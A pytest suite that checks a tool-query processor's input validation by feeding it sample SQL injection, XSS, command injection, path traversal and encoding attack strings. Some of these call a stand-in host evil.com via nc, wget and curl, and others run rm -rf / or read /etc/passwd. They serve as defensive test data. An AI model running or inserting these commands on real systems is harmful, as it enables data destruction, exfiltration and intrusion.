#!/usr/bin/env python3
"""
Security tests for input validation in tool query processor.

This module tests the security enhancements added to prevent:
- SQL injection attacks
- XSS/script injection attacks
- Command injection attacks
- Path traversal attacks
- Size limit attacks
- Encoding attacks
- Repetition-based DoS attacks
"""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from tool_query_processor import ToolQueryProcessor


class TestInputValidationSecurity:
    """Test input validation security measures."""

    def setup_method(self):
        """Set up test fixtures."""
        self.processor = ToolQueryProcessor()

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks."""
        sql_injection_queries = [
            "'; DROP TABLE tools; --",
            "' UNION SELECT * FROM tools --",
            "admin'--",
            "admin' /*",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 'x'='x",
            "'; INSERT INTO tools VALUES ('evil'); --",
            "'; UPDATE tools SET name='hacked'; --",
            "'; DELETE FROM tools; --",
            "'; EXEC xp_cmdshell('format c:'); --",
            "'; TRUNCATE TABLE tools; --",
            "'; ALTER TABLE tools ADD COLUMN evil VARCHAR(255); --",
            "'; CREATE TABLE evil AS SELECT * FROM tools; --",
        ]

        for malicious_query in sql_injection_queries:
            # Security validation should catch threats and return fallback query
            result = self.processor.process_query(malicious_query)

            # Should return ProcessedQuery, not raise exception
            assert hasattr(result, "confidence"), f"Expected ProcessedQuery for: {malicious_query}"

            # Confidence should be very low indicating processing failed due to security
            assert result.confidence <= 0.1, f"Expected low confidence for malicious query: {malicious_query}"

            # Original query should be preserved
            assert result.original_query == malicious_query

    def test_xss_script_injection_prevention(self):
        """Test prevention of XSS and script injection attacks."""
        script_injection_queries = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "vbscript:alert('xss')",
            "<script src='http://evil.com/xss.js'></script>",
            "<img src='x' onerror='alert(1)'>",
            "<div onload='alert(1)'>",
            "<input onfocus='alert(1)' autofocus>",
            "<body onmouseover='alert(1)'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>",
            "<applet code='Evil.class'></applet>",
            "onclick='alert(1)'",
            "onload='alert(1)'",
            "onerror='alert(1)'",
        ]

        for malicious_query in script_injection_queries:
            # Security validation should catch threats and return fallback query
            result = self.processor.process_query(malicious_query)

            # Should return ProcessedQuery, not raise exception
            assert hasattr(result, "confidence"), f"Expected ProcessedQuery for: {malicious_query}"

            # Confidence should be very low indicating processing failed due to security
            assert result.confidence <= 0.1, f"Expected low confidence for malicious query: {malicious_query}"

            # Original query should be preserved
            assert result.original_query == malicious_query

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_queries = [
            "query | rm -rf /",
            "query && format c:",
            "query; cat /etc/passwd",
            "$(rm -rf /)",
            "`rm -rf /`",
            "query | nc evil.com 4444",
            "search && wget http://evil.com/malware",
            "find; chmod 777 /",
            "test | curl evil.com",
            "eval('malicious code')",
            "exec('rm -rf /')",
            "system('format c:')",
        ]

        for malicious_query in command_injection_queries:
            # Security validation should catch threats and return fallback query
            result = self.processor.process_query(malicious_query)

            # Should return ProcessedQuery, not raise exception
            assert hasattr(result, "confidence"), f"Expected ProcessedQuery for: {malicious_query}"

            # Confidence should be very low indicating processing failed due to security
            assert result.confidence <= 0.1, f"Expected low confidence for malicious query: {malicious_query}"

            # Original query should be preserved
            assert result.original_query == malicious_query

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_queries = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "../../../proc/version",
            "..\\..\\windows\\win.ini",
            "/etc/passwd file access",
            "/proc/ system information",
            "query with ../ traversal",
        ]

        for malicious_query in path_traversal_queries:
            # Security validation should catch threats and return fallback query
            result = self.processor.process_query(malicious_query)

            # Should return ProcessedQuery, not raise exception
            assert hasattr(result, "confidence"), f"Expected ProcessedQuery for: {malicious_query}"

            # Confidence should be very low indicating processing failed due to security
            assert result.confidence <= 0.1, f"Expected low confidence for malicious query: {malicious_query}"

            # Original query should be preserved
            assert result.original_query == malicious_query

    def test_size_limit_enforcement(self):
        """Test enforcement of query size limits."""
        # Test maximum query length
        very_long_query = "a" * 1001  # Over 1000 char limit
        result = self.processor.process_query(very_long_query)
        # Should return fallback query with low confidence
        assert hasattr(result, "confidence"), "Expected ProcessedQuery for long query"
        assert result.confidence <= 0.1, "Expected low confidence for oversized query"

        # Test acceptable length (should work)
        acceptable_query = "a" * 100  # Under limit
        result = self.processor.process_query(acceptable_query)
        assert result is not None

        # Test maximum word count
        too_many_words = " ".join(["word"] * 51)  # Over 50 word limit
        result = self.processor.process_query(too_many_words)
        # Should return fallback query with low confidence
        assert hasattr(result, "confidence"), "Expected ProcessedQuery for too many words"
        assert result.confidence <= 0.1, "Expected low confidence for too many words"

        # Test acceptable word count
        acceptable_words = " ".join(["word"] * 10)  # Under limit
        result = self.processor.process_query(acceptable_words)
        assert result is not None

    def test_encoding_attack_prevention(self):
        """Test prevention of encoding-based attacks."""
        encoding_attack_queries = [
            "query%00with%00nulls",  # Null byte injection
            "query%0awith%0anewlines",  # Newline injection
            "query%0dwith%0dcarriage",  # Carriage return injection
            "query%3cscript%3e",  # URL encoded script tags
            "query%22with%22quotes",  # URL encoded quotes
            "query%27with%27apostrophes",  # URL encoded apostrophes
        ]

        for malicious_query in encoding_attack_queries:
            # Security validation should catch threats and return fallback query
            result = self.processor.process_query(malicious_query)

            # Should return ProcessedQuery, not raise exception
            assert hasattr(result, "confidence"), f"Expected ProcessedQuery for: {malicious_query}"

            # Confidence should be very low indicating processing failed due to security
            assert result.confidence <= 0.1, f"Expected low confidence for malicious query: {malicious_query}"

            # Original query should be preserved
            assert result.original_query == malicious_query

    def test_repetition_attack_prevention(self):
        """Test prevention of repetition-based DoS attacks."""
        # Test excessive character repetition
        char_repetition_query = "a" * 50  # 70% of 71 chars would be 'a'
        result = self.processor.process_query(char_repetition_query)
        # Should return fallback query with low confidence
        assert hasattr(result, "confidence"), "Expected ProcessedQuery for char repetition"
        assert result.confidence <= 0.1, "Expected low confidence for char repetition"

        # Test excessive word repetition
        word_repetition_query = " ".join(["spam"] * 10)  # 60% would be "spam"
        result = self.processor.process_query(word_repetition_query)
        # Should return fallback query with low confidence
        assert hasattr(result, "confidence"), "Expected ProcessedQuery for word repetition"
        assert result.confidence <= 0.1, "Expected low confidence for word repetition"

        # Test acceptable repetition (should work)
        acceptable_repetition = "search for file operations with error handling"
        result = self.processor.process_query(acceptable_repetition)
        assert result is not None

    def test_control_character_removal(self):
        """Test removal of control characters."""
        # These should be cleaned but not rejected
        control_char_queries = [
            "query\x00with\x00nulls",
            "query\twith\ttabs",
            "query\nwith\nnewlines",
            "query\rwith\rreturns",
        ]

        for query in control_char_queries:
            # Should not raise exception, but control chars should be removed
            result = self.processor.process_query(query)
            assert result is not None
            assert "\x00" not in result.cleaned_query
            assert "\t" not in result.cleaned_query or result.cleaned_query.count("\t") == 0

    def test_unicode_handling(self):
        """Test handling of Unicode characters."""
        unicode_queries = [
            "search for 文件操作",  # Chinese characters
            "búsqueda de archivos",  # Spanish with accents
            "файловые операции",  # Russian
            "🔍 search with emojis 📁",  # Emojis
            "query with unicode: αβγ",  # Greek letters
        ]

        for query in unicode_queries:
            # Should handle Unicode gracefully (may log warnings but not reject)
            result = self.processor.process_query(query)
            assert result is not None
            # Confidence may be lower for high Unicode content
            if query == "🔍 search with emojis 📁":
                # High emoji content might get lower confidence
                pass

    def test_legitimate_technical_queries(self):
        """Test that legitimate technical queries are not blocked."""
        legitimate_queries = [
            "file operations with error handling",
            "database connection management",
            "HTTP client with timeout configuration",
            "JSON parsing and validation",
            "async task execution patterns",
            "REST API authentication methods",
            "Docker container orchestration",
            "Kubernetes pod management",
            "AWS S3 bucket operations",
            "Git repository clone and pull",
            "Python package dependency resolution",
            "JavaScript module bundling webpack",
            "C++ memory management RAII",
            "SQL query optimization techniques",
            "regex pattern matching validation",
        ]

        for query in legitimate_queries:
            # These should all process successfully
            result = self.processor.process_query(query)
            assert result is not None
            assert result.confidence > 0
            assert len(result.cleaned_query) > 0

    def test_edge_case_validation(self):
        """Test edge cases in validation."""
        # Test empty query
        with pytest.raises(ValueError, match="Query cannot be empty"):
            self.processor.process_query("")

        with pytest.raises(ValueError, match="Query cannot be empty"):
            self.processor.process_query("   ")  # Only whitespace

        # Test minimum length boundary
        result = self.processor.process_query("a")  # Exactly at minimum
        assert result is not None

        # Test maximum length boundary
        max_length_query = "a" * 1000  # Exactly at maximum
        result = self.processor.process_query(max_length_query)
        assert result is not None

    def test_combined_attack_vectors(self):
        """Test queries that combine multiple attack vectors."""
        combined_attacks = [
            "'; DROP TABLE tools; <script>alert('xss')</script> --",
            "query | rm -rf / && <script>alert(1)</script>",
            "../../../etc/passwd'; DROP TABLE tools; --",
            "%3cscript%3e'; UNION SELECT * FROM users; --%3c/script%3e",
            "query with ../../../ && system('rm -rf /')",
        ]

        for malicious_query in combined_attacks:
            # Should be blocked by multiple security checks and return fallback query
            result = self.processor.process_query(malicious_query)

            # Should return ProcessedQuery, not raise exception
            assert hasattr(result, "confidence"), f"Expected ProcessedQuery for: {malicious_query}"

            # Confidence should be very low indicating processing failed due to security
            assert result.confidence <= 0.1, f"Expected low confidence for malicious query: {malicious_query}"

            # Original query should be preserved
            assert result.original_query == malicious_query

    def test_performance_under_attack(self):
        """Test that validation performance remains reasonable under attack."""
        import time

        # Test with many attack patterns
        attack_queries = [
            "'; DROP TABLE tools; --",
            "<script>alert('xss')</script>",
            "query | rm -rf /",
            "../../../etc/passwd",
            "query%00with%00nulls",
        ] * 10  # 50 total attacks

        start_time = time.time()

        for query in attack_queries:
            try:
                self.processor.process_query(query)
            except ValueError:
                pass  # Expected

        end_time = time.time()
        total_time = end_time - start_time

        # Should complete all validations quickly (< 1 second for 50 attacks)
        assert total_time < 1.0, f"Security validation too slow: {total_time:.3f}s for 50 queries"


class TestSecurityIntegration:
    """Test security measures integrated with the complete system."""

    def setup_method(self):
        """Set up test fixtures."""
        self.processor = ToolQueryProcessor()

    def test_security_with_query_expansion(self):
        """Test that security validation works with query expansion."""
        # Test that expanded queries don't bypass security
        # Even if expansion adds malicious content, it should be caught

        result = self.processor.process_query("legitimate file operations")
        assert result is not None

        # Expanded terms should be clean
        for term in result.expanded_terms:
            # Verify no malicious patterns in expanded terms
            assert "drop" not in term.lower()
            assert "script" not in term.lower()
            assert "rm -rf" not in term.lower()

    def test_security_logging(self):
        """Test that security violations are properly logged."""
        from unittest.mock import patch

        # Mock logger to capture security warnings
        with patch("tool_query_processor.logger") as mock_logger:
            try:
                self.processor.process_query("'; DROP TABLE tools; --")
            except ValueError:
                pass  # Expected

            # Should have logged security warning
            mock_logger.warning.assert_called()
            warning_calls = [call.args[0] for call in mock_logger.warning.call_args_list]
            security_warnings = [call for call in warning_calls if "injection" in call.lower()]
            assert len(security_warnings) > 0

    def test_security_error_messages(self):
        """Test that security error messages don't leak information."""
        security_test_cases = [
            ("'; DROP TABLE tools; --", "SQL patterns"),
            ("<script>alert('xss')</script>", "script patterns"),
            ("query | rm -rf /", "command patterns"),
            ("../../../etc/passwd", "path patterns"),
            ("query%00null", "URL encoded"),
        ]

        for malicious_query, expected_message_part in security_test_cases:
            # Security validation should handle gracefully and return fallback query
            result = self.processor.process_query(malicious_query)

            # Should return ProcessedQuery with low confidence instead of raising exception
            assert hasattr(result, "confidence"), f"Expected ProcessedQuery for: {malicious_query}"
            assert result.confidence <= 0.1, f"Expected low confidence for malicious query: {malicious_query}"

            # System should preserve original query but not expose it in expanded terms
            assert result.original_query == malicious_query
            # Expanded terms should be minimal for security failures
            assert len(result.expanded_terms) <= 1, "Security failures should have minimal expanded terms"


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])
